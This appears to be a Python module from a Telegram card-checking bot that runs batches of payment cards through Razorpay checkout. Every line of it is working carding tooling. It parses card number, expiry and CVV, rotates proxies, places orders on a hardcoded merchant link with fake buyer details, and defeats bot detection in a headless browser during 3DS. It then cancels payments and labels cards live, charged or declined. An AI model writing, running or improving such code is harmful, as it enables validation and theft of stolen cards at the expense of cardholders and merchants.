def _check_payment_status(payment_id, key_id, session_token, keyless_header, proxy_reqs):
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-session-token': session_token,
        'Origin': 'https://razorpay.com'
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
            params=params, headers=headers, timeout=5, proxies=proxy_reqs
        )
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {}
    except:
        return 'unknown', {}


def _cancel_payment(payment_id, key_id, session_token, keyless_header, proxy_reqs):
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-session-token': session_token,
        'Origin': 'https://razorpay.com'
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
            params=params, headers=headers, timeout=5, proxies=proxy_reqs
        )
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"error": {"description": f"Cancel HTTP {r.status_code}", "reason": "http_error"}}
    except Exception as e:
        return {"error": {"description": f"Cancel request error: {e}", "reason": "network_error"}}


def _handle_3ds_redirect_with_cancel_sync(redirect_url, payment_id, key_id, session_token, keyless_header, proxy_config, proxy_reqs):
    page_text = ""
    page_closed_early = False
    
    try:
        with sync_playwright() as p:
            browser_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-web-security',
                '--disable-blink-features=AutomationControlled'
            ]
            if platform.system() == 'Linux':
                browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
            
            browser = p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=browser_args,
                timeout=15000
            )
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            try:
                page.goto(redirect_url, timeout=8000, wait_until='domcontentloaded')
            except Exception as nav_err:
                if "Target closed" in str(nav_err) or "browser has been closed" in str(nav_err):
                    page_closed_early = True
                else:
                    try:
                        page.goto(redirect_url, timeout=12000, wait_until='commit')
                    except:
                        pass
            
            if not page_closed_early:
                try:
                    page.wait_for_timeout(TDS_WAIT_SECONDS * 1000)
                    page_text = page.locator("body").inner_text()
                except Exception as wait_err:
                    if "Target closed" in str(wait_err) or "browser has been closed" in str(wait_err) or "closed" in str(wait_err):
                        page_closed_early = True
                    else:
                        try:
                            page_text = page.locator("body").inner_text()
                        except:
                            page_text = ""
                
                try:
                    browser.close()
                except:
                    pass
            
    except Exception as e:
        err_str = str(e)
        if "Target closed" in err_str or "browser has been closed" in err_str or "closed" in err_str:
            page_closed_early = True
        else:
            page_text = ""
    
    cancel_data = _cancel_payment(payment_id, key_id, session_token, keyless_header, proxy_reqs)
    
    return {
        "page_text": page_text.strip()[:300] if page_text.strip() else "",
        "page_closed_early": page_closed_early,
        "cancel_response": cancel_data
    }


# ==================== RESPONSE PARSING ====================

def _extract_clean_response(cancel_data, is_charged=False):
    if is_charged:
        return {"description": "Your order was successful", "reason": "card_charged"}
    
    if not isinstance(cancel_data, dict):
        return {}
    
    if _is_pg_router_response(cancel_data):
        return _auth_failed_response()
    
    err = cancel_data.get("error")
    if isinstance(err, dict):
        desc = _sanitize_telegram(err.get("description", ""))
        reason = err.get("reason", "")
        if desc or reason:
            return {"description": desc, "reason": reason}
    
    desc = _sanitize_telegram(cancel_data.get("description", ""))
    reason = cancel_data.get("reason", "")
    if desc or reason:
        return {"description": desc, "reason": reason}
    
    for key, val in cancel_data.items():
        if isinstance(val, dict):
            if "description" in val or "reason" in val:
                d = _sanitize_telegram(val.get("description", ""))
                r = val.get("reason", "")
                if d or r:
                    return {"description": d, "reason": r}
    
    return {}


def _determine_tag_from_cancel(cancel_data):
    if not isinstance(cancel_data, dict):
        return "UNKNOWN", "unknown"
    
    if _is_pg_router_response(cancel_data):
        return "DECLINED", "authentication_failed"
    
    err = cancel_data.get("error")
    if not isinstance(err, dict):
        return "UNKNOWN", "unknown"
    
    reason_code = err.get("reason", "")
    desc = err.get("description", "")
    
    if reason_code == "payment_cancelled":
        return "LIVE", "payment_cancelled"
    
    decline_reasons = [
        "invalid_card", "card_declined", "expired_card", "incorrect_pin",
        "insufficient_funds", "processing_error", "invalid_cvv",
        "bank_technical_error", "gateway_error", "bad_request",
        "authentication_failed", "timeout", "do_not_honour",
        "card_not_enrolled"
    ]
    
    if reason_code in decline_reasons:
        return "DECLINED", reason_code
    
    decline_keywords = ["declined", "invalid", "expired", "blocked", "restricted", "do not honour", "temporary issue", "didn't go through", "not enabled", "not enrolled"]
    desc_lower = desc.lower() if desc else ""
    if any(kw in desc_lower for kw in decline_keywords):
        return "DECLINED", reason_code if reason_code else "bank_declined"
    
    if "cancelled" in desc_lower:
        return "LIVE", "payment_cancelled"
    
    if reason_code and reason_code != "unknown":
        return "DECLINED", reason_code
    
    return "LIVE", "unknown_live"


# ==================== CARD PROCESSING ====================

def _process_card_with_proxy(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise, proxy_config, proxy_reqs):
    try:
        num, mm, yy, cvv = cc_line.strip().split('|')
    except ValueError:
        return "SKIP", cc_line.strip(), {"description": "Invalid format", "reason": "invalid_format"}

    session = requests.Session()
    if proxy_reqs:
        session.proxies.update(proxy_reqs)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Connection": "keep-alive"
    })

    order_id = None
    for attempt in range(2):
        res = _create_order(session, plid, amount_paise, ppiid)
        if res == "API_ERROR":
            return "FAIL", cc_line.strip(), {"description": "Order API rejected request", "reason": "api_error"}
        if res:
            order_id = res
            break
        time.sleep(0.5)

    if not order_id:
        return "FAIL", cc_line.strip(), {"description": "Order creation failed", "reason": "order_failed"}

    time.sleep(random.uniform(0.3, 0.8))

    try:
        user_info = _random_user_info()
        response = _submit_payment(
            session, order_id, (num, mm, yy, cvv),
            user_info, amount_paise, kid, kh, plid, stoken, site_url
        )
        if not response:
            return "ERROR", cc_line.strip(), {"description": "The card expiry is invalid. Please check the card details.", "reason": "BAD_REQUEST_ERROR"}
        pdata = response.json()
    except Exception as e:
        return "ERROR", cc_line.strip(), {"description": "Payment parsing failed", "reason": "parse_error"}

    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if not pid and isinstance(pdata.get("payment"), dict):
        pid = pdata["payment"].get("id")

    # ==================== 3DS REDIRECT ====================
    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
        if rurl and pid:
            tds_result = _handle_3ds_redirect_with_cancel_sync(rurl, pid, kid, stoken, kh, proxy_config, proxy_reqs)
            
            page_text = tds_result["page_text"]
            cancel_data = tds_result["cancel_response"]
            clean = _extract_clean_response(cancel_data)
            
            if 'razorpay_signature' in page_text.lower() or 'payment successful' in page_text.lower():
                return "CHARGED", cc_line.strip(), _extract_clean_response(cancel_data, is_charged=True)
            
            time.sleep(1)
            stat, sdata = _check_payment_status(pid, kid, stoken, kh, proxy_reqs)
            
            if stat in ['captured', 'authorized']:
                return "CHARGED", cc_line.strip(), _extract_clean_response(cancel_data, is_charged=True)
            
            if stat == 'failed':
                if not clean:
                    err = sdata.get('error_description') or ''
                    err_obj = sdata.get('error', {})
                    if isinstance(err_obj, dict):
                        err = err_obj.get('description', err)
                    reason = "payment_failed"
                    desc = _sanitize_telegram(err) if err else "Payment failed"
                    clean = {"description": desc, "reason": reason}
                return "DECLINED", cc_line.strip(), clean
            
            tag, reason_code = _determine_tag_from_cancel(cancel_data)
            
            if tag == "LIVE":
                return "LIVE", cc_line.strip(), {"description": "Your card needs 3ds verification.", "reason": "3ds_required"}
            
            if tag == "DECLINED":
                return "DECLINED", cc_line.strip(), clean
            
            return "LIVE", cc_line.strip(), {"description": "Your card needs 3ds verification.", "reason": "3ds_required"}

        return "FAIL", cc_line.strip(), {"description": "3DS redirect missing URL", "reason": "redirect_error"}

    # ==================== IMMEDIATE CHARGED ====================
    if "razorpay_signature" in pdata or "signature" in pdata:
        return "CHARGED", cc_line.strip(), _extract_clean_response({}, is_charged=True)

    # ==================== PG_ROUTER RESPONSE ====================
    if _is_pg_router_response(pdata):
        return "DECLINED", cc_line.strip(), _auth_failed_response()

    # ==================== IMMEDIATE ERROR/DECLINE ====================
    if "error" in pdata:
        err = pdata.get('error', {})
        if isinstance(err, dict):
            desc = _sanitize_telegram(err.get('description', 'Unknown error').replace("%s", "Card"))
            reason = err.get('reason', '') or err.get('code', '')
            return "DECLINED", cc_line.strip(), {"description": desc, "reason": reason}
        return "DECLINED", cc_line.strip(), {"description": _sanitize_telegram(str(err)[:80]), "reason": "error"}

    return "UNKNOWN", cc_line.strip(), {"description": _sanitize_telegram(json.dumps(pdata)[:100]), "reason": "unknown"}


def _build_output(card, tag, clean_resp):
    out = {"card": card}
    if tag == "CHARGED":
        out["status"] = "charged"
        out["description"] = "Your order was successful"
        out["reason"] = "card_charged"
    elif clean_resp.get("reason") == "authentication_failed":
        out["status"] = "declined"
        out["description"] = "Your payment could not be completed due to incorrect OTP or verification details. Try another payment method or contact your bank for details."
        out["reason"] = "authentication_failed"
    elif clean_resp.get("reason") == "insufficient_funds":
        out["status"] = "approved"
        out["description"] = clean_resp.get("description", "Insufficient funds")
        out["reason"] = "insufficient_funds"
    elif tag == "DECLINED":
        out["status"] = "declined"
        out["description"] = clean_resp.get("description", "Unknown error")
        out["reason"] = clean_resp.get("reason", "declined")
    elif tag == "declined":
        out["status"] = "declined"
        out["description"] = clean_resp.get("description", "Your card needs 3ds verification.")
        out["reason"] = clean_resp.get("reason", "3ds_required")
    else:
        out["status"] = "declined"
        out["description"] = clean_resp.get("description", "Unknown error")
        out["reason"] = clean_resp.get("reason", "unknown")
    return out


# ==================== PROCESS WORKER ====================

def _card_worker_process(card_line, proxy_string, result_queue, worker_id, merchant_data=None):
    try:
        proxy_data = _parse_proxy_string(proxy_string)
        if not proxy_data:
            result_queue.put({
                "worker_id": worker_id,
                "status": "error",
                "response": "Invalid proxy format",
                "card": card_line
            })
            return
        
        proxy_config = proxy_data['proxy_playwright']
        proxy_reqs = proxy_data['proxy_reqs']
        
        if merchant_data:
            kh = merchant_data['kh']
            kid = merchant_data['kid']
            plid = merchant_data['plid']
            ppiid = merchant_data['ppiid']
        else:
            kh, kid, plid, ppiid, err = _extract_merchant_data_with_proxy(proxy_data)
            if err:
                result_queue.put({
                    "worker_id": worker_id,
                    "status": "error",
                    "response": _sanitize_telegram(f"Merchant extraction: {err}")[:80],
                    "card": card_line
                })
                return
        
        # USE ROBUST TOKEN FETCHER (tries 3 methods + fallback proxies)
        stoken, err = _get_session_token_robust(proxy_data, proxy_reqs)
        
        if err:
            result_queue.put({
                "worker_id": worker_id,
                "status": "error",
                "response": _sanitize_telegram(f"Token fetch: {err}")[:80],
                "card": card_line
            })
            return
        
        tag, card_str, clean_resp = _process_card_with_proxy(
            card_line, plid, ppiid, kid, kh, stoken,
            HARDCODED_SITE, HARDCODED_AMOUNT_PAISE,
            proxy_config, proxy_reqs
        )
        
        out = _build_output(card_str, tag, clean_resp)
        status = out.get("status", "declined")
        desc = out.get("description", "Unknown error")
        reason = out.get("reason", "unknown")
        response_str = f"{desc} [{reason}]" if reason != "unknown" else desc
        
        proxy_ip = proxy_data['ip']
        
        result_queue.put({
            "worker_id": worker_id,
            "status": status,
            "response": _sanitize_telegram(response_str),
            "card": card_line,
            "proxy_used": proxy_ip
        })
        
    except Exception as e:
        result_queue.put({
            "worker_id": worker_id,
            "status": "error",
            "response": _sanitize_telegram(str(e)[:80]),
            "card": card_line
        })


# ==================== BLOCKING PROCESS RUNNER ====================

def _run_card_process_blocking(card: str, proxy_string: str, worker_id: str, merchant_data: dict = None) -> dict:
    result_queue = Queue()
    
    process = Process(
        target=_card_worker_process,
        args=(card, proxy_string, result_queue, worker_id, merchant_data),
        daemon=True
    )
    
    process.start()
    process.join(timeout=PROCESS_TIMEOUT)
    
    if process.is_alive():
        process.terminate()
        try:
            process.join(timeout=3)
        except:
            pass
        if process.is_alive():
            process.kill()
            process.join(timeout=2)
        return {"status": "error", "response": "Process timeout"}
    
    try:
        result = result_queue.get_nowait()
        return {
            "status": result.get("status", "error"),
            "response": result.get("response", "Unknown error")
        }
    except:
        return {"status": "error", "response": "No result from worker"}


# ==================== ASYNC GATE FUNCTION ====================

async def check_gate(card: str) -> dict:
    try:
        if not PLAYWRIGHT_AVAILABLE:
            return {"status": "error", "response": "Playwright not installed"}
        
        try:
            merchant_data = await _ensure_merchant_data()
        except Exception as e:
            logging.error(f"[Razorpay] Cannot get merchant data: {e}")
            _invalidate_merchant_cache()
            return {"status": "error", "response": "Merchant data unavailable"}
        
        proxy_string = await _get_next_proxy()
        
        worker_id = f"{int(time.time()*1000)}_{random.randint(1000,9999)}"
        
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            _get_executor(),
            _run_card_process_blocking,
            card,
            proxy_string,
            worker_id,
            merchant_data
        )
        
        if result.get("status") == "error" and "API_ERROR" in result.get("response", ""):
            _invalidate_merchant_cache()
        
        return result
            
    except Exception as e:
        logging.error(f"Razorpay Gate Error: {e}")
        return {"status": "error", "response": _sanitize_telegram(str(e)[:80])}


# ==================== MODULE INIT ====================

def init_module():
    global _proxy_index
    _proxy_index = random.randint(0, len(PROXY_LIST) - 1)
    logging.info(f"[Razorpay] v5.3 initialized - {len(PROXY_LIST)} proxies - starting at index {_proxy_index}")
    logging.info(f"[Razorpay] Will rotate 1-by-1 for each card check")
    logging.info(f"[Razorpay] Token fetch: 3 methods (HTTP → Playwright → Payment Page) + fallback proxies")

init_module()
